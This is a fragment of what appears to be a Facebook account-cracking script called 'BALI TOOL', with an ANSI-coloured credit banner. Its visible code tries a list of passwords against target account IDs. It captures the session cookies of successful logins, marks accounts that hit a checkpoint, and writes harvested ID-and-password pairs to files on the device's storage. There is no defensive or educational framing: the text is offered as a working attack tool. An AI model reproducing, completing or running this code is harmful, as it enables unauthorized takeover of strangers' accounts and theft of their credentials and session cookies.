...
\033[1;37m================= \33[32;45mBALI\33[0;m =====================
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mBALI\33[0;m\033[1;32m && \033[1;33mBALI\33[0;m
\033[1;32m     \033[1;32mFACEBOK      : \033[1;34mBali
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mAK47GUN-MAX
\033[1;32m     \033[1;36mfriendhood  :  \033[1;3mSABA FROM INDIAN
\033[1;32m     \033[1;35mTEAM         :  \033[1;35mBALI X SABA
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
\033[1;37m================= \33[32;45mBALI\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO BALI TOOL\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(BALI-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/BALI-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(BALI-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/BALI-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[BALI] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
